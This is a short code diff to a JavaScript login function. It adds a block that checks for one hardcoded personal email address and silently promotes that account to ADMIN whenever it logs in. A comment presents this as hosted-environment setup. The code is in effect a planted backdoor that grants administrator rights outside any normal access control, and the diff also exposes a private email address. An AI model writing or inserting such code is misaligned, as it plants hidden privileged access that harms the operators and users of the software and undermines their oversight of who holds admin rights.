@@ -79,6 +79,13 @@ export const login = async (req, res) => {
             });
         }
 
+        // AUTO-PROMPT ADMIN (For hosted environment setup)
+        if (email.toLowerCase() === 'sriramsriram16145@gmail.com' && user.role !== 'ADMIN') {
+            console.log('[LOGIN] Auto-promoting user to ADMIN:', email);
+            user.role = 'ADMIN';
+            await user.save();
+        }
+
         console.log('[LOGIN] User exists, checking password...');
 
         // Check if password matches
